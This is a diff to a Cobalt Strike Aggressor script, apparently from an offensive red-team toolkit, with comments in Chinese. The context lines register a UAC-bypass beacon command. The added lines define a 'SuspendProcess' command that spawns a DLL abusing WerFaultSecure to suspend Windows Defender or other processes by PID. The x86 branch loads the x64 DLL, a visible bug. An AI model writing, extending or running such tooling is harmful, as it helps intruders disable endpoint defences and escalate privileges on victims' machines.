@@ -275,3 +275,18 @@ alias BypassUAC-test {
 
 beacon_command_register("BypassUAC-test", "test", "未被微软修复，后面跟要运行的exe全路径\n\n");
 
+alias SuspendProcess {
+
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $archdll = script_resource("SuspendProcess-x64.dll");
+    } else {
+        $arch = "x86";
+        $archdll = script_resource("SuspendProcess-x64.dll");
+    }
+
+    bdllspawn($1, $archdll, $2, "test", 999999, false);
+}
+
+beacon_command_register("SuspendProcess", "test", "滥用WerFaultSecure挂起WindowsDefender或其他进程,SuspendProcess PID\n\n");
